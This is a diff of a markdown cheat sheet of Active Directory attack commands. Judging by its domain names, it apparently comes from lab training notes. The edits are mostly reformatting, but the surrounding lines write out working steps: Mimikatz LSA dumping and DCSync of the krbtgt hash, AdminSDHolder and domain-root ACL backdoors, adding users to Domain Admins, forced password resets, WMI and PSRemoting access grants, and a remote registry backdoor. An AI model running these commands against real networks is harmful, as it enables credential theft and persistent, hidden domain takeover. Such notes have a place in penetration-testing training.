@@ -5,7 +5,7 @@
 # On DC as a DA
 C:> Invoke-Mimikatz -Command '"lsadump:lsa /patch"'
 
-# DC-Sync attack
+# DC-Sync attack. DA rights required
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user_<domain>\krbtgt"'
 ```
 ### Golden Ticket
@@ -70,7 +70,7 @@ C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security
 
 ### ACL Persistence
 
-- **SDPROP and AdminSDHolder**
+##### SDPROP and AdminSDHolder
 
   AdminSDHolder is a special AD container with some "default" security permissions that is used as a template for protected AD accounts and groups (like Domain Admins, Enterprise Admins, etc.) to prevent their accidental and unintended modifications, and to keep them secure.
 Once you have agained Domain Admin privileges, AdminSDHolder container can be abused by backdooring it by giving your user GenericAll privileges, which effectively makes that user a Domain Admin.
@@ -101,12 +101,12 @@ C:> Add-DomainGroupMember -Identity 'Domain Admins' .Members <username> -Verbose
 # Change user password
 C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-SecureString "Password@" -AsPlainText -Force) -Verbose
 ```
-- **Domain Root Object ACL**
+##### Domain Root Object ACL
 ```powershell
 # Add Full Rights to Domain Root ACL
 C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
-- **DCSync**
+##### DCSync
 ```powershell
 # Check if a user has DCSync rights. Gives nothing if no rights and
 C:> Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<user>"}
@@ -118,7 +118,7 @@ C:> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -P
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-- **WMI Security Descriptors**
+##### WMI Security Descriptors
 
 ```powershell
 # To be able to run WMI commands
@@ -134,8 +134,11 @@ C:> . .\RACE.ps1
 
 # Allow <user> WMI access in host. Domain Admin privileges shell process required
 C:> Set-RemotePSRemoting –SamAccountName <username> -ComputerName <hostname_full_FQDN> -Verbose
+
+# Now can run WMI on host
+C:> gwmi -class win32_operatingsystem -ComputerName <host>
 ```
-- **Remote Registry**
+##### Remote Registry
 ```powershell
 # Using RACE, with admin privs on remote machine
 C:> Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <username> -Verbose
